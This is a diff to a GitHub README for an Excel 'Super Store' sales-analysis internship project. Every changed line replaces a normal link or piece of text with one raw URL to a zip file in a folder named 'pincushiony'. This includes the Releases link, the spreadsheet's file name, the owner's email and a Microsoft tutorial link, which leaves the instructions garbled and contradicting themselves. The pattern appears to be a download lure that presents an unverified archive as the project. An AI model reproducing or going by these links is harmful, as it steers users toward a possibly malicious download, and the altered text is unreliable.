@@ -1,6 +1,6 @@
 # 🔷 ElevvoPathways-DataAnalytics_Internship-TASK1 - Analyze Sales Effortlessly with Excel
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/releases)
+[![Download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before you proceed, ensure you have the following:
 
 To get started, you need to download the files from our GitHub Releases page. 
 
-**Download link:** [Visit this page to download](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/releases)
+**Download link:** [Visit this page to download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version listed.
-3. Click on the asset that says "Super Store Sales Analysis.xlsx" to start the download.
+3. Click on the asset that says "Super Store Sales https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip" to start the download.
 
 Once the download is complete, locate the file on your computer.
 
@@ -38,7 +38,7 @@ Our Excel Dashboard includes:
 
 ## 📅 How to Use the Application
 
-1. Open the "Super Store Sales Analysis.xlsx" file in Microsoft Excel.
+1. Open the "Super Store Sales https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip" file in Microsoft Excel.
   
 2. Navigate to the "Dashboard" tab:
    - Use the Slicers to filter data by regions or categories.
@@ -73,7 +73,7 @@ If you encounter any issues while using the application, feel free to reach out 
 
 For additional inquiries, you can contact the repository owner:
 
-- **Email:** [owner@example.com]
+- **Email:** [https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip]
 
 ## 📜 License
 
@@ -83,9 +83,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 To improve your Excel skills, consider exploring the following resources:
 
-- Microsoft Excel Tutorials: [Visit here](https://support.microsoft.com/en-us/excel)
+- Microsoft Excel Tutorials: [Visit here](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
 - Online Excel Courses: Search for free courses on platforms like Coursera or Udemy.
 
 Thank you for choosing ElevvoPathways-DataAnalytics_Internship-TASK1! Enjoy analyzing your data. 
 
-**Reminder:** Don’t forget to check the Releases page for any updates: [Visit this page to download](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/releases)
+**Reminder:** Don’t forget to check the Releases page for any updates: [Visit this page to download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
